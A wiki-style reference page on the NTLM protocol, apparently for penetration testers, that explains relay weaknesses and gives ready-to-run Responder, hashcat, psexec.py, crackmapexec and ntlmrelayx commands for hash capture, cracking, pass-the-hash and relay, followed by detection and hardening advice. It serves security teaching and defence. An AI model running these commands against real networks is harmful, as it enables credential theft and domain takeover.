---
title: NTLM
slug: ntlm
---

> **TL;DR:** Three-message challenge-response auth (NEGOTIATE / CHALLENGE / AUTHENTICATE) keyed by the NT hash. Lacks per-message binding to a target SPN, so a man-in-the-middle can relay an in-flight authentication to a different service — the source of most "compromise the domain from an unauth foothold" chains.

## What it is
NT LAN Manager v2 is the fallback authentication protocol used when Kerberos isn't available (workgroup, IP-literal SMB, HTTP without SPN, cached cred on a non-domain box). The client never sees the server's secret; it just XORs/HMACs a server-supplied challenge with a key derived from the user's NT hash. The protocol is also embedded inside other transports (SMB, HTTP via WWW-Authenticate, LDAP SASL, MSSQL) — the same three messages travel under whatever wrapper the application uses.

## Preconditions / where it applies
- Anywhere SMB/HTTP/LDAP services are reachable
- Pass-the-Hash needs the NT hash (cracked, dumped from LSASS/SAM, or stolen via SMB roasting)
- Relay needs an authentication you can intercept *and* a destination service that is OK with relayed NTLM (no signing, no EPA)

## Technique
**Capture / crack.** Responder coerces broadcast name resolution (LLMNR / NBT-NS / mDNS) and harvests NetNTLMv2 hashes. Crack with hashcat mode 5600:

```bash
responder -I eth0 -wF
hashcat -m 5600 hashes.txt rockyou.txt -r best64.rule
```

**Pass-the-Hash.** Authenticate with just the NT hash, no plaintext:

```bash
psexec.py -hashes :aad3b435...:31d6cfe0... corp.local/svc_admin@web01
crackmapexec smb 10.0.0.0/24 -u alice -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

**Relay.** Combine capture (Responder, mitm6 IPv6 DNS takeover, or RPC coercion) with ntlmrelayx to forward authentication to a useful target:

```bash
# Disable Responder's SMB/HTTP servers first so it just resolves the name
responder -I eth0 -dwv  # -d = downgrade, -w = no WPAD
ntlmrelayx.py -tf targets.txt -smb2support --delegate-access -i
```

Common relay destinations: LDAP (write RBCD on a target machine), SMB (admin shell on unsigned hosts), AD CS HTTP/RPC (ESC8/ESC11 → cert), HTTP/MSSQL (xp_cmdshell, app-level pivot). Channel-binding-aware targets (EPA enabled) reject relayed HTTPS/LDAPS.

**Hash formats.** LM (`aad3b...` = empty), NT (16-byte MD4 of UTF-16LE password), NetNTLMv1 / v2 (challenge-response). NT hashes are passable forever until the password changes — there is no per-session salt.

## Detection and defence
- Disable NTLMv1 (`LMCompatibilityLevel ≥ 3`) and audit NTLMv2 use; aim to disable NTLM entirely (Windows 11 24H2 / Server 2025 supports `RestrictNTLM`)
- Require SMB signing, LDAP signing + channel binding, and EPA on HTTP services
- Disable LLMNR (GPO) and NBT-NS on every adapter; switch off IPv6 RA accept or use RA Guard to block mitm6
- Monitor 4624/4625 logon type 3 with auth package NTLM from unusual sources; watch for RC4 etype on Kerberos-capable hosts (downgrade marker)

## References
- [Microsoft Open Specs — MS-NLMP](https://learn.microsoft.com/openspecs/windows_protocols/ms-nlmp/) — protocol reference
- [HackTricks — NTLM](https://book.hacktricks.wiki/en/windows-hardening/ntlm/index.html) — relay / PtH playbook
- [Hacker Recipes — NTLM](https://www.thehacker.recipes/a-d/movement/ntlm) — attack catalogue with command snippets
- See also: [[ms-rpc-abuse]], [[ntlm-relay-ws2025-mitigations]], [[resource-based-constrained-delegation]]
